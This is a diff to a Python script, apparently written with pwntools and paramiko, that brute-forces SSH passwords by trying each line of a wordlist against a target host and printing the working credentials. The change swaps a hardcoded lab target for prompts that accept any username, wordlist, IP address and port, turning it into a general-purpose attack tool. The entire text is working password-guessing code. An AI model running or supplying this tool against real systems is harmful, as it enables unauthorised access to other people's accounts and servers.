@@ -3,22 +3,26 @@ from pwn import *
 import paramiko
 from paramiko.client import SSHClient
 
-# Define SSH connection details
-SSH_USER = "exploit"
-SSH_HOST = "192.168.1.196"
-SSH_PORT = 22
+# Prompt the user for input
+user = input("Please enter a username: ")
+wordlist = input("Please provide the wordlist file name or path (e.g., password.txt or /home/user/wordlists/password.txt): ")
+ip = input("Please enter an IP address: ")
+port = int(input("Please enter a port number: "))
 
-# Open and read the password file 'pass.txt'
-with open('pass.txt') as pw:
-    # Read each line from the file and remove trailing newline characters ('\n')
+# SSH connection parameters
+SSH_USER = user
+SSH_HOST = ip
+SSH_PORT = port
+
+# Open and read the wordlist file
+with open(wordlist) as pw:
+    # Read each line from the wordlist file and remove any trailing whitespace
     lines = [line.rstrip() for line in pw]
 
-# Iterate through each line in the password file
+# Iterate through each password in the wordlist
 for x in lines:
-    # Create an SSH client instance
     client = SSHClient()
 
-    # Load system host keys (known hosts)
     client.load_system_host_keys()
     try:
         # Attempt to establish an SSH connection
@@ -26,9 +30,9 @@ for x in lines:
                        username=SSH_USER,
                        password=x,
                        look_for_keys=False)
-        # If the connection is successful, print a success message and break out of the loop
-        print(f"Connected successfully with User: {SSH_USER} and Password: {x}")
+        # Print a success message and break the loop if the connection is successful
+        print(f"Successfully connected with User: {SSH_USER} and Password: {x}")
         break
     except Exception:
-        # If the connection fails, print an error message
-        print("Failed to establish connection.")
+        # Print a failure message if the connection fails
+        print("Failed to establish a connection.")
